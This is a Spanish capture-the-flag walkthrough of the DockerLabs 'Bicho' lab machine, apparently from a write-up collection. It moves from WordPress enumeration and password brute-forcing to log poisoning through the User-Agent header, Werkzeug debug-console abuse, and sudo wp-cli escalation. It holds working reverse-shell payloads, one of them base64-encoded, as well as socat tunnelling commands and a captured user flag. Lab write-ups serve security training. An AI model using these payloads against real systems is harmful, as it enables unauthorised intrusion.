---
icon: flag
---

# Bicho DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bicho.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh bicho.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 10:57 EDT
Nmap scan report for crystalteam.dl (172.17.0.2)
Host is up (0.000068s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://bicho.dl
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

Veremos que solo hay un puerto `80` abierto en el que aloja una pagina web por lo que vamos a entrar dentro de la misma para ver que contiene.

Veremos que hay una web por defecto alojada por `apache2` pero si vemos en el escaneo de `nmap` veremos que redirige a un dominio en concreto llamado `bicho.dl` por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>        bicho.dl
```

Lo guardamos y volvemos a entrar en la pagina pero esta vez mediante el dominio.

```
URL = http://bicho.dl/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

Vemos que esta pagina esta soportada por el `software` llamado `wordpress`, por lo que vamos a utilizar la herramienta llamada `wpscan`.

## wpscan

```shell
wpscan --url http://bicho.dl/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://bicho.dl/ [172.17.0.2]
[+] Started: Sat May  3 11:04:44 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://bicho.dl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://bicho.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://bicho.dl/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://bicho.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://bicho.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://bicho.dl/?feed=rss2, <generator>https://wordpress.org/?v=6.6.2</generator>
 |  - http://bicho.dl/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.6.2</generator>

[+] WordPress theme in use: bosa-travel-agency
 | Location: http://bicho.dl/wp-content/themes/bosa-travel-agency/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2025-03-27T00:00:00.000Z
 | Readme: http://bicho.dl/wp-content/themes/bosa-travel-agency/readme.txt
 | Style URL: http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2
 | Style Name: Bosa Travel Agency
 | Style URI: https://bosathemes.com/bosa-travel-agency
 | Description: Bosa Travel Agency is multipurpose business theme. Bosa Travel Agency is beautiful, fast, lightweigh...
 | Author: Bosa Themes
 | Author URI: https://bosathemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2, Match: 'Version: 1.0.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] bicho
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat May  3 11:04:46 2025
[+] Requests Done: 70
[+] Cached Requests: 6
[+] Data Sent: 15.642 KB
[+] Data Received: 22.729 MB
[+] Memory used: 204.621 MB
[+] Elapsed time: 00:00:02
```

Veremos que hemos descubierto un usuario llamado `bicho` por lo que vamos a intentar `crackear` la contraseña de dicho usuario.

```shell
wpscan --url http://bicho.dl/ --usernames bicho --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://bicho.dl/ [172.17.0.2]
[+] Started: Sat May  3 11:06:33 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://bicho.dl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://bicho.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://bicho.dl/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://bicho.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://bicho.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://bicho.dl/?feed=rss2, <generator>https://wordpress.org/?v=6.6.2</generator>
 |  - http://bicho.dl/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.6.2</generator>

[+] WordPress theme in use: bosa-travel-agency
 | Location: http://bicho.dl/wp-content/themes/bosa-travel-agency/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2025-03-27T00:00:00.000Z
 | Readme: http://bicho.dl/wp-content/themes/bosa-travel-agency/readme.txt
 | Style URL: http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2
 | Style Name: Bosa Travel Agency
 | Style URI: https://bosathemes.com/bosa-travel-agency
 | Description: Bosa Travel Agency is multipurpose business theme. Bosa Travel Agency is beautiful, fast, lightweigh...
 | Author: Bosa Themes
 | Author URI: https://bosathemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
^Cying bicho / lavette1 Time: 00:07:25 <                                                                          > (111160 / 14344392)  0.77%  ETA: 15:50:41
[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                > (111165 / 14344392)  0.77%  ETA: 15:50:41
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat May  3 11:14:03 2025
[+] Requests Done: 111311
[+] Cached Requests: 37
[+] Data Sent: 35.676 MB
[+] Data Received: 562.88 MB
[+] Memory used: 316.488 MB
[+] Elapsed time: 00:07:29

Scan Aborted: Canceled by User
```

Pero no encontraremos nada, tampoco ningun `plugin` que pueda ser vulnerable ni nada, por lo que vamos a seguir realizando un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://bicho.dl/wp-content/ -w <WORDLIST> -x html,php,txt,log -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bicho.dl/wp-content/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,log
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 273]
/.php                 (Status: 403) [Size: 273]
/themes               (Status: 200) [Size: 0]
/uploads              (Status: 200) [Size: 962]
/index.php            (Status: 200) [Size: 0]
/plugins              (Status: 200) [Size: 0]
/upgrade              (Status: 200) [Size: 772]
/fonts                (Status: 200) [Size: 1664]
/debug.log            (Status: 200) [Size: 21743019]
/.php                 (Status: 403) [Size: 273]
/.html                (Status: 403) [Size: 273]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos un archivo bastante interesante llamado `debug.log`, vamos a entrar dentro de dicho archivo a ver que encontramos.

```
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)</pre>
[03-May-2025 15:14:03 UTC] <pre>Intento de inicio de sesión fallido para el usuario: bicho desde la IP: 172.17.0.1 con User-Agent: WPScan v3.8.28
...............................<RESTO_CODIGO>....................................
```

Veremos que podemos visualizar los `logs` y nos aparecera la fuerza bruta que hemos realizado anteriormente con `wpscan`, vamos a probar si podemos realizar un `Log Poisoning` de la siguiente forma:

De primeras vemos que se esta mostrando con un `<pre>` la informacion del usuario, la `IP` y el `User-Agent`, vamos a probar a capturar la peticion del `login` de `wordpress` para modificar el `User-Agent` e intentar `injectar` codigo `PHP` para ver si se visualiza en los `logs`.

Cuando capturemos la peticion, veremos algo asi:

```
URL = http://bicho.dl/wp-login.php
```

> PETICION:

```
POST /wp-login.php HTTP/1.1
Host: bicho.dl
User-Agent: <?php phpinfo();?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://bicho.dl/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://bicho.dl
Connection: keep-alive
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbicho.dl%2Fwp-admin%2F&testcookie=1
```

Recargamos el `debug.log` y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Veremos que se esta injectando, por lo que esta funcionando, pero si ponemos un `exec` directamente, no va a funcionar, por lo que vamos a codificar el `payload` y ejecutarlo de la siguiente forma:

```php
<?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzcuMTI5Lzc3NzcgMD4mMQ==|base64 -d|bash`;?>
```

Ahora la peticion tendra que quedar de la siguiente forma:

```
POST /wp-login.php HTTP/1.1
Host: bicho.dl
User-Agent: <?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzcuMTI5Lzc3NzcgMD4mMQ==|base64 -d|bash`;?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://bicho.dl/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://bicho.dl
Connection: keep-alive
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbicho.dl%2Fwp-admin%2F&testcookie=1
```

Antes de enviarla nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Cuando la enviemos, tendremos que recargar la siguiente pagina:

```
URL = http://bicho.dl/wp-content/debug.log
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 56190
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Veremos que hemos obtenido acceso con el usuario `www-data` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user app

Si listamos los puertos del servidor veremos lo siguiente:

```shell
netstat -tuln
```

Info:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
```

Veremos un puerto interesante que esta en local que seria el `5000` vamos a pasarnos dicho puerto realizando un `portforwarding` a nuestro `host` pero como no tendremos el binario `socat` en la maquina victima, vamos a pasarnos el binario a la maquina victima de la siguiente forma:

```shell
cp /usr/bin/socat .
python3 -m http.server
```

Ahora en la maquina victima nos lo descargaremos:

```shell
cd /tmp
wget http://<IP>:8000/socat
chmod +x socat
```

Una vez echo esto vamos a utilizar dicho `binario` para realizar la tunelizacion del puerto:

```shell
./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000
```

Info:

```
./socat: error while loading shared libraries: libwrap.so.0: cannot open shared object file: No such file or directory
```

Veremos que nos falta una libreria, por lo que tambien nos la vamos a importar a la maquina victima de la siguiente forma.

> HOST

```shell
find / -name "libwrap.so.0" 2>/dev/null
```

Info:

```
/usr/lib/x86_64-linux-gnu/libwrap.so.0
```

Vamos a compiar dicho archivo a nuestra carpeta actual:

```shell
cp /usr/lib/x86_64-linux-gnu/libwrap.so.0 .
```

Echo esto vamos a volvernos abrir un servidor de `python3` para pasarnos el archivo.

```shell
python3 -m http.server
```

> VICTIM

```shell
wget http://<IP>:8000/libwrap.so.0
```

Ahora vamos a exportar la variable de entorno.

```shell
export LD_LIBRARY_PATH=/tmp
```

Vamos a comprobar que lo esta pillando de forma correcta:

```shell
ldd ./socat
```

Info:

```
		linux-vdso.so.1 (0x00007f4f2cffb000)
        libwrap.so.0 => /tmp/libwrap.so.0 (0x00007f4f2cf35000)
        libssl.so.3 => /lib/x86_64-linux-gnu/libssl.so.3 (0x00007f4f2ce88000)
        libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007f4f2c975000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4f2c763000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f4f2cffd000)
```

Vemos que nos lo esta pillando bien, por lo que ahora si, vamos a ejecutarlo:

```shell
./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000
```

Ahora si vamos a nuestro `host` y ponemos la siguiente ruta que hemos expuesto:

```
URL = http://<IP_VICTIM>:7755/
```

Info:

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

Veremos que esta funcionando, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

### Gobuster

```shell
gobuster dir -u http://<IP>:9000/ -w <WORDLIST> -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:9000/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 400) [Size: 167]
Progress: 46381 / 220561 (21.03%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 46847 / 220561 (21.24%)
===============================================================
Finished
===============================================================
```

Veremos que nos saco un directorio bastante interesante llamado `console` pero de primeras vemos que esta con un `400` de error, esto no significa que no exista, si no que algun parametro en la peticion esta mal formado y sabiendo que es un servidor `Flask` podemos deducir por que puede ser, si notros intentamos entrar en dicho servidor veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a probar a meter en la cabecera de la peticion el `Host` adecuado, para que se cera que se esta haciendo a nivel local.

```shell
curl -H "Host: 127.0.0.1" http://<IP_VICTIM>:9000/console
```

Info:

```
<!doctype html>
<html lang=en>
  <head>
    <title>Console // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = true,
          EVALEX = true,
          EVALEX_TRUSTED = true,
          SECRET = "MKZonli1puF4yZAA1HyW";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>Interactive Console</h1>
<div class="explanation">
In this console you can execute Python expressions in the context of the
application.  The initial namespace was created by the debugger automatically.
</div>
<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>
```

Vemos que esta vez no nos esta dando el error `400` por lo que vamos a capturar la peticion con `BurpSuite` y modificar el `Host` desde el mismo para que nos redirija de forma correcta a la pagina y podamos visualizarlo.

Cuando hayamos capturado la peticion veremos algo asi:

```
GET /console HTTP/1.1
Host: 172.17.0.2:9000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Y lo tendremos que dejar asi:

```
GET /console HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Ahora si le damos directamente al boton de `Intercept on` para que se ponga en `off` y volvemos a la pagina veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, ahora estamos viendo una pagina en la que podemos ejecutar lo que parece codigo en `python` vamos a probar a injectar algun comando basico:

```python
print(__import__('subprocess').check_output('whoami',shell=True).decode())
```

Info:

```
app
```

Veremos que esto se esta ejecutando mediante el usuario `app` pero cada vez que tengamos que ejecutar un comando tendremos que capturarlo con `BurpSuite` y cambiarle el `Host` por que si no, no va a funcionar.

Vamos a crearnos una `reverse shell` con el siguiente `payload`:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

Antes de enviarlo nos pondremos a la escucha con `nc` de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora cuando enviemos dicho `payload` y lo capturemos con `BurpSuite` cambiemos el `Host` al adecuado y le demos al boton de dejar de interceptar y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 5555 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 58216
app@de41e2e0eb7b:/$ whoami
whoami
app
```

Vemos que hemos obtenido una `shell` con el usuario `app`, vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user wpuser

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for app on de41e2e0eb7b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User app may run the following commands on de41e2e0eb7b:
    (wpuser) NOPASSWD: /usr/local/bin/wp
```

Vemos que podemos ejecutar el binario `wp` como el usuario `wpuser` por lo que vamos a ver que hace dicho binario.

Si buscamos informacion sobre dicho binario veremos que podemos ejecutar comando con el binario bajo el usuario `wpuser` en este caso, pero si intentamos algo asi:

```shell
sudo -u wpuser /usr/local/bin/wp eval 'system("id");'
```

Veremos que nos da un error de que el `PATH` al que esta intentando acceder dicho usuario donde contiene el `wordpress` no es accesible o no esta bien configurado, si nosotros le pasamos como parametro el `PATH` donde esta el `Wordpress` tampoco nos dejara ya que hay algo en la maquina que no lo esta permitiendo:

```shell
sudo -u wpuser /usr/local/bin/wp --path=/var/www/bicho.dl eval 'system("id");'
```

Info:

```
Error: This does not seem to be a WordPress installation.
The used path is: /var/www/bicho.dl/
Pass --path=`path/to/wordpress` or run `wp core download`.
```

Pero esto tiene una facil solucion, podemos descargarnos los archivos del `wordpress` con dicho usuario en una carpeta en `tmp` para simular que es un `wordpress` de la siguiente forma:

```shell
mkdir /tmp/fakewp
cd /tmp/fakewp
chmod 777 /tmp/fakewp
```

Una vez creado la carpeta dandole los permisos necesarios y metiendonos dentro de la misma, haremos lo siguiente:

```
sudo -u wpuser /usr/local/bin/wp core download
```

Con esto lo que haremos sera descargar todo el contenido de `wordpress`a dicha carpeta, una vez que se haya descargado todo, moveremos el archivo de configuracion de la `DDBB` para que tenga el nombre que necesita para `wordpress`.

```shell
cp /tmp/fakewp/wp-config-sample.php /tmp/fakewp/wp-config.php
```

Esto esta claro que estara vacio a nivel de credenciales, no podra realizar la conexion real a la `DDBB`, ya que si intentamos esto:

```shell
sudo -u wpuser /usr/local/bin/wp --path=/tmp/fakewp eval 'system("id");'
```

Nos va a dar un error de que no consigue acceder a la `DDBB` mediante el archivo de configuracion de `wordpress`, pero antes de realizar lo siguiente le daremos permisos para que podamos hacer despues una cosa.

```shell
chmod 777 /tmp/fakewp/wp-config.php
```

Ahora con estos permisos vamos a ir a la otra terminal con la que tenemos el usuario `www-data` y vamos a realizar lo siguiente:

```shell
cd /var/www/bicho.dl
cat wp-config.php > /tmp/fakewp/wp-config.php
```

Echo esto lo que estaremos haciendo sera pasar la configuracion de la `DDBB` a la de nuestro `wordpress` falso, por lo que si nos vamos a la otra terminal y ejecutamos el siguiente comando, si podra establecer una conexion con la `DDBB` y podremos ejecutar comandos como el usuario `wpuser`:

```shell
sudo -u wpuser /usr/local/bin/wp --path=/tmp/fakewp eval 'system("id");'
```

Info:

```
PHP Warning:  Constant WP_DEBUG already defined in phar:///usr/local/bin/wp/vendor/wp-cli/wp-cli/php/WP_CLI/Runner.php(1335) : eval()'d code on line 85
uid=1002(wpuser) gid=1002(wpuser) groups=1002(wpuser),100(users)
```

Veremos que ha funcionado, por lo que vamos a ejecutarnos una `reverse shell` de la siguiente forma:

```shell
sudo -u wpuser /usr/local/bin/wp --path=/tmp/fakewp eval 'system("bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"");'
```

Antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos el comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 6666 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 51674
wpuser@de41e2e0eb7b:/tmp/fakewp$ whoami
whoami
wpuser
```

Vemos que ha funcionado por lo que seremos el usuario `wpuser` y vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora leeremos la `flag` del usuario.

> user.txt

```
ab1555f24bc7065bcdd1a119f09898c7
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for wpuser on de41e2e0eb7b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User wpuser may run the following commands on de41e2e0eb7b:
    (root) NOPASSWD: /opt/scripts/backup.sh
```

